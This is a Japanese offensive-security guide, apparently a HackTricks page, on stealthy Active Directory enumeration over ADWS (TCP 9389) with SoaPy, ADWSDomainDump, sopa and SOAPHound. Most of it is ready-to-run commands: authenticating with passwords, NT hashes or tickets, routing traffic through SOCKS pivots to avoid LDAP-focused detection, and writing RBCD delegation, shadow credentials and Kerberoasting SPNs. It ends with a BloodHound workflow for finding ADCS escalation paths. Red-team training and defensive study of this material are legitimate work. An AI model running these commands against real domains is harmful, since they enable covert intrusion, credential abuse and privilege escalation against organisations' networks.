# Active Directory Web Services (ADWS) の列挙とステルス収集

{{#include ../../banners/hacktricks-training.md}}

## ADWS とは？

Active Directory Web Services (ADWS) は、**Windows Server 2008 R2 以降、すべての Domain Controller でデフォルトで有効**になっており、TCP **9389** をリッスンします。名前に反して、**HTTP は使用されません**。代わりに、このサービスは独自の .NET framing protocol のスタックを介して LDAP 形式のデータを公開します。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

通信はこれらのバイナリ SOAP フレーム内にカプセル化され、一般的ではないポートを通るため、**ADWS 経由の列挙は、従来の LDAP/389 および 636 の通信に比べて、検査・フィルタリング・シグネチャ検知を受ける可能性が大幅に低くなります**。オペレーターにとって、これは次のことを意味します。<sup>[[1]](#references)[[7]](#references)</sup>

* よりステルス性の高い偵察 – Blue team は LDAP クエリに注目することが多い。
* SOCKS proxy 経由で 9389/TCP をトンネリングし、**Windows 以外のホスト (Linux、macOS)** から収集できる。
* LDAP 経由で取得できるものと同じデータ (ユーザー、グループ、ACL、スキーマなど) に加え、**書き込み**も実行できる (例: **RBCD** 用の `msDs-AllowedToActOnBehalfOfOtherIdentity`)。

ADWS とのやり取りは WS-Enumeration 上で実装されています。各クエリは、LDAP filter/attributes を定義する `Enumerate` メッセージから始まり、`EnumerationContext` GUID を返します。その後、1 つ以上の `Pull` メッセージで、サーバーが定義した結果ウィンドウの件数まで結果をストリームします。<sup>[[7]](#references)</sup> Context は約 30 分後に期限切れになるため、状態を失わないよう、ツールは結果をページ分割するか、filter を分割する (CN ごとの prefix query) 必要があります。<sup>[[8]](#references)</sup> Security descriptor を要求する場合は、`LDAP_SERVER_SD_FLAGS_OID` control を指定して SACL を省略してください。指定しないと、ADWS は SOAP response から `nTSecurityDescriptor` attribute を単に削除します。

> 注: ADWS は多くの RSAT GUI/PowerShell ツールでも使用されるため、通信が正規の管理アクティビティに紛れ込む可能性があります。

## SoaPy – ネイティブ Python クライアント

[SoaPy](https://github.com/logangoins/soapy) は、**ADWS protocol stack を pure Python で完全に再実装したもの**です。NBFX/NBFSE/NNS/NMF フレームをバイト単位で生成するため、.NET runtime に触れることなく Unix 系システムから収集できます。<sup>[[1]](#references)[[2]](#references)</sup>

### 主な機能

* **SOCKS 経由の proxy** をサポート (C2 implant からの利用に便利)。
* LDAP の `-q '(objectClass=user)'` と同様の、細かな検索 filter。
* RBCD、SPN、アカウントフラグ、key credential に対する対象を絞った **書き込み**操作。<sup>[[2]](#references)</sup>
* SOAPy の出力は **BOFHound** で解析し、BloodHound にインポートできる。<sup>[[2]](#references)[[3]](#references)</sup>
* 人が読みやすい形式が必要な場合、`--parse` flag で timestamp / `userAccountControl` を見やすく整形できる。<sup>[[2]](#references)</sup>

### 対象を絞った収集フラグと書き込み操作

SoaPy には、ADWS 経由でよく使われる LDAP hunting task を再現する、用途別の switch が用意されています。`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds` に加え、カスタム取得用の raw `--query` / `--filter` オプションがあります。これらと、`--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定)、`--spn <service/cn>` (対象を絞った Kerberoasting 用の SPN staging)、`--asrep` (`userAccountControl` の `DONT_REQ_PREAUTH` を反転) などの書き込み機能を組み合わせてください。<sup>[[2]](#references)</sup>

`samAccountName` と `servicePrincipalName` だけを返す、対象を絞った SPN 検索の例:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

同じホスト/認証情報を使って、見つかった内容をすぐに悪用します。`--rbcds` で、RBCD がすでに設定されているオブジェクトをダンプし、その後 `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` を適用して、Resource-Based Constrained Delegation チェーンを仕込みます（悪用手順の全容については、[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照してください）。<sup>[[2]](#references)</sup>

### インストール（オペレーターのホスト）

upstream リポジトリから最新の SOAPy CLI をインストールします。実行ファイル名は、Unix 系システムでは大文字と小文字が区別されます。<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### SOCKS pivot経由のticket-only収集

足場からKerberos ticketは取得できても平文パスワードが得られない場合は、[Pass the Ticket](pass-the-ticket.md)の説明に従って`.kirbi` ticketを`ccache`に変換し、そのcacheをSOAPyに指定します。DCのLDAP service向けticketは、文書化されているSOAPy ADWS workflowで使用できます。ADWSとKerberosの両方の通信をpivot経由でルーティングしてください。<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### ADWS 経由の Shadow credentials

現在の principal が対象オブジェクトの `msDS-KeyCredentialLink` に書き込み可能な場合、SOAPy を使って ADWS 経由で key credential を追加し、対応する PFX をエクスポートできます。属性全体をクリアするのではなく、正確に削除できるよう、返された DeviceID を記録してください。[Shadow Credentials](acl-persistence-abuse/shadow-credentials.md) で説明されているように、PFX を PKINIT に使用します。<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAPクエリをTCP/9389上のADWS呼び出しに置き換え、LDAP-signatureの検知を減らす`ldapdomaindump`のフォーク。
* `--force`を指定しない限り、最初に9389への到達可能性チェックを実行する（ポートスキャンが検知されやすい、またはフィルタリングされている場合はプローブをスキップ）。
* READMEでは、Microsoft Defender for EndpointおよびCrowdStrike Falconに対するbypassの成功が報告されている。<sup>[[4]](#references)</sup>

### インストール

```bash
pipx install .
```

### 使用方法

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

一般的な出力では、9389 の到達可能性チェック、ADWS bind、dump の開始と完了が記録されます：

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang向けADWS実用クライアント

soapyと同様に、[sopa](https://github.com/Macmod/sopa)はGolangでADWSプロトコルスタック（MS-NNS + MC-NMF + SOAP）を実装し、次のようなADWS呼び出しを実行するコマンドラインフラグを提供します。<sup>[[5]](#references)</sup>

* **オブジェクトの検索と取得** - `query` / `get`
* **オブジェクトのライフサイクル管理** - `create [user|computer|group|ou|container|custom]` および `delete`
* **属性の編集** - `attr [add|replace|delete]`
* **アカウント管理** - `set-password` / `change-password`
* その他、`groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]` など

### プロトコル対応の概要

* LDAP形式の検索は、属性の射影、スコープ制御（Base/OneLevel/Subtree）、ページネーションに対応した **WS-Enumeration**（`Enumerate` + `Pull`）で実行されます。
* 単一オブジェクトの取得には **WS-Transfer** の `Get`、属性の変更には `Put`、削除には `Delete` を使用します。
* 組み込みオブジェクトの作成には **WS-Transfer ResourceFactory** を使用し、カスタムオブジェクトにはYAMLテンプレートを使った **IMDA AddRequest** を使用します。
* パスワード操作には **MS-ADCAP** アクション（`SetPassword`、`ChangePassword`）を使用します。<sup>[[5]](#references)</sup>

### 未認証でのメタデータ検出（mex）

ADWSは認証情報なしでWS-MetadataExchangeを公開するため、認証前に公開状態を手早く確認できます。<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC discovery と Kerberos targeting に関する注意点

`--dc` を省略し、`--domain` を指定すると、Sopa は SRV を使って DC を解決できます。次の順序でクエリを実行し、最も優先度の高いターゲットを使用します。<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

セグメント化された環境での失敗を避けるため、運用上は DC が管理する resolver を優先してください。

* `--dns <DC-IP>` を指定すると、すべての SRV/PTR/forward lookup が DC の DNS 経由になります。
* UDP がブロックされている場合や、SRV の応答が大きい場合は `--dns-tcp` を使用します。
* `--dc` に IP を指定すると、Kerberos を使用しない場合でも、ADWS の `wsa:To` address filter には FQDN が必要なため、sopa は必ず **reverse PTR** lookup を実行します。reverse zone がない場合は、DC の FQDN を直接指定してください。<sup>[[5]](#references)</sup>

例（IP + Kerberos、DC 経由の DNS を強制）:

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### 認証情報のオプション

平文パスワードのほか、sopa は ADWS 認証に **NT ハッシュ**、**Kerberos AES キー**、**ccache**、**PKINIT 証明書**（PFX または PEM）をサポートしています。`--aes-key`、`-c`（ccache）、または証明書ベースのオプションを使用すると、Kerberos が暗黙的に選択されます。<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### template によるカスタムオブジェクトの作成

任意のオブジェクトクラスでは、`create custom` コマンドで IMDA `AddRequest` に対応する YAML template を使用します:<sup>[[5]](#references)</sup>

* `parentDN` と `rdn` でコンテナーと相対 DN を定義します。
* `attributes[].name` は `cn` または名前空間付きの `addata:cn` をサポートします。
* `attributes[].type` は `string|int|bool|base64|hex` または明示的な `xsd:*` を受け付けます。
* `ad:relativeDistinguishedName` または `ad:container-hierarchy-parent` は含めないでください。sopa が自動で追加します。
* `hex` 値は `xsd:base64Binary` に変換されます。空文字列を設定するには `value: ""` を使用します。

## SOAPHound – 大量の ADWS Collection（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) は、すべての LDAP インタラクションを ADWS 内で行い、BloodHound v4 互換の JSON を出力する .NET collector です。完全な `objectSid`、`objectGUID`、`distinguishedName`、`objectClass` の cache を一度構築し（`--buildcache`）、その後、大量の `--bhdump`、`--certdump`（ADCS）、または `--dnsdump`（AD 統合 DNS）処理で再利用するため、DC から外部に出る重要な属性は約 35 個だけです。AutoSplit（`--autosplit --threshold <N>`）は、クエリを CN prefix ごとに自動で分割し、大規模フォレストでの EnumerationContext の 30 分の timeout を回避します。<sup>[[8]](#references)</sup>

ドメイン参加済みのオペレーター VM での一般的なワークフロー:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

ExportされたJSONをそのままSharpHound/BloodHoundのワークフローに取り込めます。後続のグラフ化のアイデアについては、[BloodHound methodology](bloodhound.md)を参照してください。AutoSplitにより、SOAPHoundは数百万オブジェクトを含むフォレストでも、ADExplorer形式のスナップショットより少ないクエリ数で安定して動作します。

## Stealth AD Collection Workflow

以下のワークフローでは、LinuxからADWS経由で**ドメインおよびADCSオブジェクト**を列挙し、BloodHound JSONに変換して、証明書ベースの攻撃経路を探索します。

1. **9389/TCPを**ターゲットネットワークから手元のマシンにトンネルします（例：Chisel、Meterpreter、SSH dynamic port-forwardなど）。`proxychains4 SOAPy ...`を使ってraw TCPクライアントをSOCKS経由でルーティングします（`proxychains4.conf`でSOCKS5のアドレスを設定してください）。`HTTPS_PROXY`では、この非HTTPプロトコルをプロキシできません。<sup>[[9]](#references)</sup>

2. **ルートドメインオブジェクトを収集します:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC から ADCS 関連オブジェクトを収集する:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHoundに変換:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIPをアップロード**してBloodHound GUIで、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`などのcypherクエリを実行し、証明書による権限昇格経路（ESC1、ESC8など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` の書き込み（RBCD）

対象コンピューターオブジェクトへの書き込みアクセス権がある場合、生のsecurity-descriptor文字列ではなく、SOAPyのRBCD actionを使用します。ここでは、`WEBSRV01$`が制御下のソースで、`FILE01$`が属性を変更する対象です。<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) の Kerberos S4U chain を続けます。

## Tooling Summary

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS 列挙 | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、読み取り/書き込み |
| 大量の ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、cache-first、BH/ADCS/DNS modes |
| BloodHound への取り込み | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch のログを変換 |
| Cert の侵害 | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS 経由でプロキシ可能 |
| ADWS の列挙とオブジェクトの変更 | [sopa](https://github.com/Macmod/sopa) | 既知の ADWS endpoints とやり取りする汎用クライアント。列挙、オブジェクトの作成、属性の変更、パスワードの変更が可能 |



## References

- [1] [SpecterOps – SOAP(y) を必ず使おう – ADWS を利用したステルス性の高い AD 収集のためのオペレーター向けガイド](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMF の仕様](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS を使った Active Directory 環境のステルス性の高い列挙](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS 経由で Active Directory データを収集する SOAPHound ツール](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – 偵察](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
